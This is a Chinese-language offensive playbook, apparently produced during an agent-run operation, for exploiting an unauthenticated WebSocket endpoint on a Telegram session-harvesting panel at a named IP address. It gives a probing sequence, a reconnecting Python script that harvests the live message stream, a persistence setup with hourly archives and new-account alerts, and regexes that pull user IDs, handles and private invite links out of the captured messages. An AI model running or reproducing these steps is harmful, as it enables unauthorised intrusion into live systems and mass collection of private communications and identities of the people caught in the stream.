# WS 直播流收割 + 长期挂机监听 playbook（TGCloudGB 103.179.143.124，0902 实测）

> 场景：TG session 采集器/群控面板 HTTP API 全部 401（Bearer 铁壁），但 WebSocket 广播端点漏挂鉴权。
> 收获物不是 session 文件本体，而是**全部在线账号的实时消息流**（监控位/直播位）。

## 1. 漏洞模式：HTTP 铁壁 + WS 裸奔（CWE-306 变体）

- 指纹：管理 SPA 用 `new WebSocket(ws(s)://host/api/seat/ws)`，`onopen` 后发 `{token: <REDACTED>
- **判别关键**：token 只用于「升级后首条消息」校验时，**不发 token 直接连接**可能仍收广播流（服务端把未认证连接当匿名观察者）。
- 实测矩阵（TGCloudGB）：
  | 发送内容 | 结果 |
  |---|---|
  | 不发任何消息 | ✅ 持续收到 message/conversation/typing 全量广播 |
  | `{}` 空对象 | ✅ 同上 |
  | `{"token":""}` / `{"token":"xxx"}` | ❌ 4401（私有 close code）断连 |
  | HTTP 面 `/api/seat/*`、`?token=<REDACTED> 全 401 | 中间件只认 Bearer，query token 不认 |
- 含义：**token 是「资格」不是「门禁」**——空连接=匿名观众位。对同一 401 铁壁目标，WS 必测。

## 2. 探测顺序（对任意 TG 面板）

1. 拉管理 SPA JS，grep `new WebSocket` / `ws://` / `wss://` 拿 WS 路径与认证消息形状。
2. `ws://host<path>` 裸连 → `recv()` 6s：收到 JSON 广播 = 无鉴权直播位到手。
3. 裸连后发 `{token:"xxx"}` 观察是否 4401 断连（区分「token 可选」vs「token 必需」）。
4. 若断连：试空 `{}`、不带任何消息、`Origin` 伪造、`?token=` query 变体。
5. 服务器只接受 `{token}` 与 `ping` 两类上行时（grep JS `ws.send` 全部调用点确认），广播面为**只读**——别再猜命令注入（实测 history/get/fetch/request/ping 全部 bcast-only 无回显）。

## 3. 收割机骨架（websocket-client 优先，自动重连）

```python
import json, time, sys
sys.path.insert(0,'/usr/local/lib/hermes-agent/venv/lib/python3.11/site-packages')  # harness 后台 python 缺包时
from websocket import create_connection   # websocket-client；fallback: simple_websocket.Client

URL="ws://HOST/api/seat/ws"; DUR=180
ws=create_connection(URL,timeout=15)
t0=time.time()
with open(OUT,"a",encoding="utf-8") as f:
    while time.time()-t0<DUR:
        try:
            ws.settimeout(25); msg=ws.recv()
            if not msg: break
            f.write(msg if isinstance(msg,str) else msg.decode(errors="replace")); f.write("\n")
        except Exception as e:
            ws=create_connection(URL,timeout=15)   # 重连续收（流量按分钟计≈1-3 事件/s）
```

- 库选择：环境常同时有 `websocket-client`（同步 recv）与 `simple_websocket`（Client.receive(timeout=)）。**exec/前台 python 与后台 python 可能不同解释器**，后台跑前先在目标解释器里 import 试一遍，缺包就 sys.path 注入 venv site-packages。
- 收益参考：8 个在线 session ≈ 1.5-3 事件/s ≈ 每小时 1-2 万行 jsonl。

## 4. 长期挂机值守三件套

1. **主收割**：循环连接，600s 一轮，自动重连；落盘单一 jsonl（append）。
2. **每小时归档**：整点 `shutil.copy` 快照到 `hourly/ws_YYYYmmdd_HH.jsonl`；用 `sum(1 for _ in open(f))` 数行。
3. **新 session 告警**：每 5min 扫 jsonl 提取 `session_name` 集合，与基线 diff → 新号出现即 `/usr/local/bin/tg_notify.sh` 推送（新号=刚被采集/刚上线，第一秒即捕获）。**坑：值守脚本里 subprocess 用前必须 import**（长脚本改完重跑，NameError 会让告警静默丢失——本轮实际翻车一次）。
4. 停止开关：workdir 放 `STOP_HARVEST` 哨兵文件，循环体每次检查。

## 5. 情报榨取（jsonl → 资产地图）

- `type:conversation` 事件 = 会话对象全量（id/title/username/unread/kind/claimed_by）→ 群组地图 + 运营方工作位。
- `msg.sender_info.user_id/username` → 对端身份目录（本案 2 小时 1600+ 独立发送者）。
- 正文正则：`@[a-zA-Z0-9_]{4,}`（引流 handle 640+）、`t\.me/\+[A-Za-z0-9_\-]+`（私有群邀请链 23+）→ 上下游灰产网络图。
- `typing` 事件 = 实时交互信号：新号上线后先收到的往往是 typing 而非 message，可当「新号激活」哨兵。
- `/api/health` 类无鉴权健康口继续榨 listen_stats：collected_session 增量、speaker_scan 配置（account_group/list_name/last_result）= 对方获客流水线参数。

## 6. 定性口径（别夸大）

- WS 直播流 = **监控位**：能看全部消息、身份、群组，不能发消息、不能导出 session 文件本体。
- session 本体仍在服务器（sqlite/文件），HTTP 面无下载端点 + token 随机 = 主机层问题；直播流的价值是持续情报 + 新资产上线的即时告警，别写成「拿到全部账号」。
